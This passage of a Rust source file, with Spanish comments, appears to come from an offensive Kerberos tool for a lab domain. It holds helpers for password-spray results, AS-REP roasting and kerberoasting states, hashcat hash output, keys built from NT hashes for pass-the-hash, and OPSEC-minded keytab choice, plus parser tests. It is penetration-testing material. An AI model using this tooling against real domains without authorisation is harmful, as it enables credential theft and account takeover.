            return Err(format!("línea {}: usuario vacío", n + 1));
        }
        if pw.is_empty() {
            return Err(format!("línea {}: contraseña vacía (¿línea incompleta?)", n + 1));
        }
        out.push((u.to_string(), pw.to_string()));
    }
    Ok(out)
}

/// Contraseña desde argv/env o desde stdin (`--password-stdin`): la vía
/// stdin evita que el secreto quede visible en `ps` y en el history del
/// shell. argv se mantiene por comodidad en el lab.
///
/// El tipo de retorno es `Zeroizing<String>` y el argumento también: el
/// String del argv/env se MUEVE dentro del envoltorio sin copias y se
/// ceroiza al soltar (igual que la copia de stdin — incluido el buffer
/// de línea, que retiene el secreto con el salto). Así ninguna ruta deja
/// contraseñas en memoria liberada, deuda abierta desde la Ronda 2.
fn resolve_password(password: Option<Zeroizing<String>>, stdin: bool) -> Result<Zeroizing<String>, String> {
    use zeroize::Zeroize;
    if stdin {
        let mut buf = String::new();
        std::io::stdin()
            .lock()
            .read_line(&mut buf)
            .map_err(|e| format!("no pude leer la contraseña de stdin: {e}"))?;
        let pw = buf.trim_end_matches(['\r', '\n']).to_string();
        buf.zeroize();
        if pw.is_empty() {
            return Err("stdin cerrado o contraseña vacía".into());
        }
        return Ok(Zeroizing::new(pw));
    }
    password.ok_or_else(|| {
        "falta la contraseña: usa -p/--password, la env CHARON_PASSWORD o --password-stdin".into()
    })
}

/// Vuelca líneas (hashes hashcat, aciertos de spray) a un fichero.
fn write_output(path: &str, lines: &[String]) -> Result<(), String> {
    std::fs::write(path, lines.join("\n") + if lines.is_empty() { "" } else { "\n" })
        .map_err(|e| format!("no pude escribir {path}: {e}"))?;
    eprintln!(
        "{} {} líneas escritas en {}",
        "escrito:".dimmed(),
        lines.len(),
        path.cyan()
    );
    Ok(())
}

/// Imprime el resultado de un intento de spray con el mismo lenguaje
/// visual que enum/kerberoast.
fn print_spray(a: &charon_attacks::SprayAttempt) {
    use charon_attacks::SprayResult as SR;
    match &a.result {
        SR::Valid => {
            println!("{} {} — CONTRASEÑA VÁLIDA (TGT obtenido)", "✓".green().bold(), a.user.cyan())
        }
        SR::WrongPassword => {
            println!("{} {} — incorrecta (el usuario existe, preauth fallido)", "✗".red().bold(), a.user.cyan())
        }
        SR::UnknownUser => println!("{} {} — inexistente", "✗".dimmed(), a.user.cyan()),
        SR::NoPreauth => println!(
            "{} {} — sin preauth: la contraseña no interviene (AS-REP roasteable)",
            "!".yellow().bold(),
            a.user.cyan()
        ),
        SR::KdcError { code, detail } => {
            println!("{} {} — error KDC {code} {detail}", "!".yellow().bold(), a.user.cyan())
        }
    }
}

/// JSON estructurado de un UserStatus (contrato de la Ronda VI, sin el
/// Debug de Rust: estados snake_case estables y campos dedicados para
/// salts y códigos — consumidores `jq` sin acoplarse a nombres internos).
fn user_status_json(user: &str, st: &charon_attacks::UserStatus) -> serde_json::Value {
    use charon_attacks::UserStatus as US;
    let mut obj = serde_json::json!({ "user": user });
    match st {
        US::ExistsWithPreauth { salts } => {
            obj["exists"] = serde_json::json!(true);
            obj["state"] = serde_json::json!("exists_preauth");
            obj["salts"] = serde_json::json!(salts
                .iter()
                .map(|(etype, salt)| serde_json::json!({
                    "etype": etype,
                    "etype_name": etype_name(*etype),
                    "salt": salt,
                }))
                .collect::<Vec<_>>());
        }
        US::ExistsWithoutPreauth => {
            obj["exists"] = serde_json::json!(true);
            obj["state"] = serde_json::json!("no_preauth");
            obj["asreproastable"] = serde_json::json!(true);
        }
        US::Unknown => {
            obj["exists"] = serde_json::json!(false);
            obj["state"] = serde_json::json!("unknown");
        }
        US::PreauthFailed => {
            obj["exists"] = serde_json::json!(true);
            obj["state"] = serde_json::json!("preauth_failed");
        }
        US::Other(code) => {
            obj["exists"] = serde_json::json!(true);
            obj["state"] = serde_json::json!("other");
            obj["code"] = serde_json::json!(code);
        }
    }
    obj
}

/// JSON estructurado de un SprayResult (mismo contrato que enum: estados
/// snake_case estables, `valid` explícito, código y detalle aparte).
fn spray_result_json(user: &str, r: &charon_attacks::SprayResult) -> serde_json::Value {
    use charon_attacks::SprayResult as SR;
    let mut obj = serde_json::json!({ "user": user });
    match r {
        SR::Valid => {
            obj["valid"] = serde_json::json!(true);
            obj["state"] = serde_json::json!("valid");
        }
        SR::WrongPassword => {
            obj["valid"] = serde_json::json!(false);
            obj["state"] = serde_json::json!("wrong_password");
        }
        SR::UnknownUser => {
            obj["valid"] = serde_json::json!(false);
            obj["state"] = serde_json::json!("unknown_user");
        }
        SR::NoPreauth => {
            obj["valid"] = serde_json::json!(false);
            obj["state"] = serde_json::json!("no_preauth");
            obj["asreproastable"] = serde_json::json!(true);
        }
        SR::KdcError { code, detail } => {
            obj["valid"] = serde_json::json!(false);
            obj["state"] = serde_json::json!("kdc_error");
            obj["code"] = serde_json::json!(code);
            if !detail.is_empty() {
                obj["detail"] = serde_json::json!(detail);
            }
        }
    }
    obj
}

/// Aprende el salt del usuario con un AS-REQ sin preauth: el error 25 del
/// KDC regala el PA-ETYPE-INFO2. El protocolo le dice a Charon cómo
/// construir la clave del usuario.
fn learn_salt(c: &KdcConnection, user: &str, realm: &str) -> Result<String, String> {
    let etypes = [etype_mod::AES256_CTS_HMAC_SHA1_96];
    match charon_client::probe_as_no_preauth(c, user, realm, &etypes).map_err(|e| e.to_string())? {
        charon_client::AsProbe::PreauthRequired { salts, .. } => {
            match salts.iter().find(|s| s.etype == etype_mod::AES256_CTS_HMAC_SHA1_96) {
                Some(s) if s.salt.is_some() => Ok(String::from_utf8_lossy(s.salt.as_ref().unwrap()).into_owned()),
                _ => Ok(format!("{realm}{user}")), // construcción estándar como fallback documentado
            }
        }
        charon_client::AsProbe::NoPreauth { .. } => Ok(format!("{realm}{user}")),
        other => Err(format!("no pude aprender el salt de {user}: {}", other_desc_probe(&other))),
    }
}

fn other_desc_probe(p: &charon_client::AsProbe) -> String {
    match p {
        charon_client::AsProbe::PreauthRequired { .. } => "preauth requerido".into(),
        charon_client::AsProbe::NoPreauth { .. } => "sin preauth".into(),
        charon_client::AsProbe::PrincipalUnknown { .. } => "usuario inexistente".into(),
        charon_client::AsProbe::PreauthFailed { .. } => "preauth fallido".into(),
        charon_client::AsProbe::Error { code, e_text, .. } => format!("error {code} {e_text:?}"),
    }
}

/// Clave a partir de contraseña (AES con salt aprendido) o hashes.
#[allow(clippy::too_many_arguments)]
fn key_from_credentials(
    _user: &str,
    _realm: &str,
    _salt: &str,
    password: &str,
    nt_hash: Option<&str>,
    aes_key: Option<&str>,
) -> Result<KerberosKey, String> {
    if let Some(h) = nt_hash {
        let b = decode_hex(h)?;
        return KerberosKey::from_raw(etype_mod::RC4_HMAC, &b).map_err(|e| e.to_string());
    }
    if let Some(h) = aes_key {
        let b = decode_hex(h)?;
        let et = match b.len() {
            16 => etype_mod::AES128_CTS_HMAC_SHA1_96,
            32 => etype_mod::AES256_CTS_HMAC_SHA1_96,
            n => return Err(format!("clave AES de {n} bytes: deben ser 16 o 32")),
        };
        return KerberosKey::from_raw(et, &b).map_err(|e| e.to_string());
    }
    // TGT con AES256: la contraseña nunca viaja por el cable, solo el
    // preauth cifrado.
    KerberosKey::from_password(password, _salt, etype_mod::AES256_CTS_HMAC_SHA1_96).map_err(|e| e.to_string())
}

/// Aviso si un fichero de material sensible (keytab, ccache) es legible
/// por grupo/otros: ambos formatos llevan claves EN CLARO (diseño del
/// formato); MIT los crea 0600 y así deben quedarse. Es un aviso a
/// stderr, no un error: leerlos es legítimo.
#[cfg(unix)]
fn warn_lax_secret_file_perms(path: &str, what: &str) {
    use std::os::unix::fs::PermissionsExt;
    if let Ok(md) = std::fs::metadata(path) {
        let mode = md.permissions().mode();
        if mode & 0o077 != 0 {
            eprintln!(
                "{} el {what} {path} es legible por grupo/otros (permisos {:04o}): \
                 contiene claves en claro — recomendado 0600",
                "aviso:".yellow().bold(),
                mode & 0o777
            );
        }
    }
}

#[cfg(not(unix))]
fn warn_lax_secret_file_perms(_path: &str, _what: &str) {}

/// Clave a partir de un keytab: la entrada cuyo principal coincide con
/// `user@realm` (por nombre cualificado o por nombre plano + reino).
/// AES depende del salt = reino + usuario, así que el reino de la
/// entrada DEBE coincidir con el pedido — no hay match silencioso entre
/// reinos distintos. Devuelve la clave junto a su kvno y enctype para
/// el mensaje del CLI.
fn key_from_keytab(path: &str, user: &str, realm: &str) -> Result<(KerberosKey, u32, i32), String> {
    warn_lax_secret_file_perms(path, "keytab");
    let bytes = std::fs::read(path).map_err(|e| format!("no pude leer {path}: {e}"))?;
    let entries =
        charon_krb5::keytab::parse(&bytes).map_err(|e| format!("keytab {path}: {e}"))?;
    let wanted = format!("{user}@{realm}");
    let entry = entries
        .iter()
        .find(|e| e.qualified() == wanted)
        .ok_or_else(|| {
            let list = entries.iter().map(|e| e.qualified()).collect::<Vec<_>>().join(", ");
            if list.is_empty() {
                format!("el keytab {path} no tiene entradas")
            } else {
                format!("el keytab {path} no trae clave para {wanted} (entradas: {list})")
            }
        })?;
    let key = KerberosKey::from_raw(entry.enctype, &entry.key).map_err(|e| e.to_string())?;
    Ok((key, entry.kvno, entry.enctype))
}

/// TODAS las entradas de un keytab para `user@realm` (una cuenta puede
/// llevar varias enctypes: AES256/AES128/RC4 — ktadd las exporta todas).
/// Los comandos S4U lo necesitan para elegir la clave de descifrado del
/// ticket según el etype REAL que el KDC eligió (ver s4u2self).
fn keys_from_keytab(path: &str, user: &str, realm: &str) -> Result<Vec<(KerberosKey, u32, i32)>, String> {
    warn_lax_secret_file_perms(path, "keytab");
    let bytes = std::fs::read(path).map_err(|e| format!("no pude leer {path}: {e}"))?;
    let entries =
        charon_krb5::keytab::parse(&bytes).map_err(|e| format!("keytab {path}: {e}"))?;
    let wanted = format!("{user}@{realm}");
    let mut out = Vec::new();
    for e in &entries {
        if e.qualified() == wanted {
            let key = KerberosKey::from_raw(e.enctype, &e.key).map_err(|e| e.to_string())?;
            out.push((key, e.kvno, e.enctype));
        }
    }
    if out.is_empty() {
        let list = entries.iter().map(|e| e.qualified()).collect::<Vec<_>>().join(", ");
        return Err(if list.is_empty() {
            format!("el keytab {path} no tiene entradas")
        } else {
            format!("el keytab {path} no trae clave para {wanted} (entradas: {list})")
        });
    }
    Ok(out)
}

/// Elige la mejor entrada del keytab para PEDIR un TGT: AES256, luego
/// AES128 y por último RC4 (OPSEC: sin downgrade si la cuenta trae AES;
/// el resto de enctypes queda disponible para el descifrado del ticket
/// S4U).
fn pick_keytab_key(keys: &[(KerberosKey, u32, i32)], user: &str) -> Result<(KerberosKey, u32, i32), String> {
    let pref = |want: i32| keys.iter().find(|k| k.2 == want).cloned();
    pref(etype_mod::AES256_CTS_HMAC_SHA1_96)
        .or_else(|| pref(etype_mod::AES128_CTS_HMAC_SHA1_96))
        .or_else(|| pref(etype_mod::RC4_HMAC))
        .ok_or_else(|| format!("el keytab no trae ninguna enctype soportada para {user}"))
}

/// Nombres legibles de los flags de ticket (para la salida JSON de `as`).
fn ticket_flag_names(flags: u32) -> Vec<&'static str> {
    use charon_krb5::ticket_flags as tf;
    let mut out = Vec::new();
    let mut push = |set: bool, name: &'static str| {
        if set {
            out.push(name);
        }
    };
    push(flags & tf::FORWARDABLE != 0, "forwardable");
    push(flags & tf::RENEWABLE != 0, "renewable");
    push(flags & tf::INITIAL != 0, "initial");
    push(flags & tf::PRE_AUTHENT != 0, "pre_authent");
    push(flags & tf::HW_AUTHENT != 0, "hw_authent");
    push(flags & tf::TRANSITED_POLICY_CHECKED != 0, "transited_policy_checked");
    push(flags & tf::OK_AS_DELEGATE != 0, "ok_as_delegate");
    out
}

fn decode_hex(s: &str) -> Result<Vec<u8>, String> {
    hex::decode(s.trim()).map_err(|e| format!("hex inválido ({e}): se esperaba una cadena par de dígitos hex"))
}

fn etype_name(id: i32) -> &'static str {
    match id {
        18 => "AES256-CTS-HMAC-SHA1-96",
        17 => "AES128-CTS-HMAC-SHA1-96",
        23 => "RC4-HMAC",
        _ => "desconocido",
    }
}

/// Silencia el warning de funciones de resultado aún no usadas en rutas JSON.
#[allow(dead_code)]
fn _ensure_stdout_flushed() {
    let _ = std::io::stdout().flush();
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tmp_file(name: &str, content: &str) -> String {
        let path = std::env::temp_dir().join(name);
        std::fs::write(&path, content).unwrap();
        path.to_str().unwrap().to_string()
    }

    #[test]
    fn resolve_pairs_acepta_comentarios_dos_puntos_en_clave_y_crlf() {
        let path = tmp_file(
            "charon-test-pairs-ok.txt",
            "# lista del lab\r\njdoe:Jdoe!Pass42\r\naesuser:con:dos:ultimos\n\n  legacy:  con espacios  \n",
        );
        let pairs = resolve_pairs(&path).unwrap();
        assert_eq!(
            pairs,
            vec![
                ("jdoe".to_string(), "Jdoe!Pass42".to_string()),
                ("aesuser".to_string(), "con:dos:ultimos".to_string()),
                ("legacy".to_string(), "con espacios".to_string()),
            ]
        );
        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn resolve_pairs_falla_con_numero_de_linea_si_faltan_los_dos_puntos() {
        let path = tmp_file("charon-test-pairs-mal.txt", "jdoe:buena\nlinea-rompida\n");
        let err = resolve_pairs(&path).unwrap_err();
        assert!(err.contains("línea 2"), "debe señalar la línea concreta: {err}");
        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn resolve_pairs_rechaza_usuario_o_contrasena_vacios() {
        let path = tmp_file("charon-test-pairs-vacios.txt", "jdoe:buena\n:sin-usuario\n");
        let err = resolve_pairs(&path).unwrap_err();
        assert!(err.contains("línea 2") && err.contains("usuario vacío"), "{err}");

        let path2 = tmp_file("charon-test-pairs-vacios2.txt", "jdoe:\n");
        let err2 = resolve_pairs(&path2).unwrap_err();
        assert!(err2.contains("contraseña vacía"), "{err2}");

        std::fs::remove_file(&path).ok();
        std::fs::remove_file(&path2).ok();
    }

    // ---------- tests de `charon ccache` ----------

    use charon_krb5::ccache::{CcacheCredential, CcacheFile, CcachePrincipal};
    use charon_krb5::{EncryptedData, EncryptionKey, PrincipalName, Ticket};

    /// Ccache sintético construido con el propio codec (mismo camino que
    /// `save_tgt`): un TGT de jdoe con endtime = ahora + `offset_secs`
    /// (acepta negativos para simular credenciales caducadas).
    fn ccache_de_ejemplo(offset_secs: i64) -> Vec<u8> {
        let now = unix_now() as u32;
        let endtime = (i64::from(now) + offset_secs) as u32;
        let ticket = Ticket {
            tkt_vno: 5,
            realm: "LAB.LOCAL".into(),
            sname: PrincipalName::krbtgt("LAB.LOCAL"),
            enc_part: EncryptedData {
                etype: 18,
                kvno: Some(2),
                cipher: vec![0xde, 0xad, 0xbe, 0xef],
            },
        };
        let cred = CcacheCredential {
            client: CcachePrincipal::user("jdoe", "LAB.LOCAL"),
            server: CcachePrincipal::from_principal(&PrincipalName::krbtgt("LAB.LOCAL"), "LAB.LOCAL"),
            key: EncryptionKey { keytype: 18, keyvalue: vec![0x11; 32] },
            authtime: now - 600,
            starttime: Some(now - 600),
            endtime,
            renew_till: Some(endtime + 604_800),
            is_skey: false,
            flags: charon_krb5::ticket_flags::FORWARDABLE | charon_krb5::ticket_flags::RENEWABLE,
            ticket_der: ticket.build().expect("ticket DER"),
        };
        CcacheFile::single(cred).to_bytes().expect("ccache bytes")
    }

    #[test]
    fn ccache_info_reporta_tgt_completo_y_vigente() {
        let info = ccache_info(&ccache_de_ejemplo(7200)).expect("parsea");
        assert_eq!(info.version, 4);
        assert_eq!(info.default_principal, "jdoe@LAB.LOCAL");
        assert_eq!(info.credentials.len(), 1);
        let c = &info.credentials[0];
        assert!(c.is_tgt, "krbtgt/... debe marcarse como TGT");
        assert!(!c.is_config_entry);
        assert!(!c.expired, "endtime a +2 h no puede salir caducada");
        assert_eq!(c.client, "jdoe@LAB.LOCAL");
        assert_eq!(c.server, "krbtgt/LAB.LOCAL@LAB.LOCAL");
        assert_eq!(c.session_etype, 18);
        assert_eq!(c.ticket_kvno, Some(2));
        assert_eq!(c.ticket_sname.as_deref(), Some("krbtgt/LAB.LOCAL"));
        assert!(c.flags.contains(&"forwardable") && c.flags.contains(&"renewable"));
        assert!((7000..=7200).contains(&c.seconds_left), "quedan {:?}", c.seconds_left);
        // El JSON hereda el contrato de la Ronda V: snake_case, sin ANSI,
        // tiempos Kerberos (GeneralizedTime, sufijo Z).
        let j = info.to_json("t.ccache");
        assert_eq!(j["format_version"], 4);
        assert_eq!(j["credentials"][0]["is_tgt"], true);
        assert_eq!(j["credentials"][0]["session_etype_name"], "AES256-CTS-HMAC-SHA1-96");
        let end = j["credentials"][0]["endtime"].as_str().unwrap();
        assert!(end.ends_with('Z') && end.len() >= 15, "endtime Kerberos: {end}");
    }

    #[test]
    fn ccache_info_marca_caducada() {
        let info = ccache_info(&ccache_de_ejemplo(-3600)).expect("parsea");
        let c = &info.credentials[0];
        assert!(c.expired);
        assert!(c.seconds_left <= -3599, "un reloj en el pasado sale negativo: {:?}", c.seconds_left);
    }

    #[test]
    fn ccache_info_rechaza_bytes_corruptos_sin_panics() {
        assert!(ccache_info(&[]).is_err());
        assert!(ccache_info(&[0x05, 0x02]).is_err());
        let bytes = ccache_de_ejemplo(600);
        for cut in [2usize, 12, 40, bytes.len() - 3] {
            assert!(ccache_info(&bytes[..cut]).is_err(), "truncado a {cut} debe fallar");
        }
    }

    #[test]
    fn ccache_info_marca_entrada_de_configuracion_sin_ticket() {
        use charon_krb5::ccache::X_CACHECONF_REALM;
        let mut cred = CcacheCredential {
            client: CcachePrincipal::user("jdoe", "LAB.LOCAL"),
            server: CcachePrincipal::user("krb5_ccache_conf_data", "X-CACHECONF:"),
            key: EncryptionKey { keytype: 0, keyvalue: vec![] },
            authtime: 0,
            starttime: None,
            endtime: 0,
            renew_till: None,
            is_skey: false,
            flags: 0,
            ticket_der: vec![1, 2, 3],
        };
        cred.server = CcachePrincipal {
            name_type: charon_krb5::name_type::NT_PRINCIPAL,
            realm: X_CACHECONF_REALM.into(),
            components: vec!["krb5_ccache_conf_data".into(), "pa_type".into()],
        };
        let bytes = CcacheFile::single(cred).to_bytes().expect("bytes");
        let info = ccache_info(&bytes).expect("parsea");
        let c = &info.credentials[0];
        assert!(c.is_config_entry);
        assert!(!c.is_tgt);
        assert_eq!(c.ticket_kvno, None, "una entrada de config no lleva ticket");
        // El JSON de una entrada de configuración no inventa datos:
        // etype/tiempos/kvno a null (campos a 0 del formato).
        let j = info.to_json("t.ccache");
        let jc = &j["credentials"][0];
        assert_eq!(jc["is_config_entry"], true);
        assert!(jc["session_etype"].is_null());
        assert!(jc["authtime"].is_null());
        assert!(jc["endtime"].is_null());
        assert!(jc["ticket_kvno"].is_null());
        assert_eq!(jc["expired"], false);
    }
}
